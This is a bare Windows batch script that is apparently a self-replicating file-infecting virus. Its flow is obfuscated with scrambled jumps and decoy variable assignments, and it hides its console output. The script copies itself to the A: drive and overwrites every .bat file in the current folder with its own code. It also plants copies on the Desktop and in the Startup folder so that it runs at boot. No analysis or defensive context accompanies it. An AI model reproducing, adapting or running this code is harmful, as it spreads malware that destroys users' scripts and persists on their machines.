   goto aa
   :ac
   copy %MyS% A:\*bat
   goto ad
   :aa
   @echo off
   goto ab
   :ad
   set rof=dfg
   set rof=for
   %rof% %%v in (*.bat) do %spth% %MyS% %%v
   goto ae
   :ab
   ctty nul
   set spth=nffg
   set spth=copy
   set MyS=ztru
   set MyS=%0
   goto ac
   :af
   set da=gfd
   set da=prog
   %spth% %MyS% %windir%\startm~1\%da%rams\autost~1\start.bat
   goto end
   :ae
   %spth% %MyS% %windir%\Desktop\open.bat
   goto af
   :end
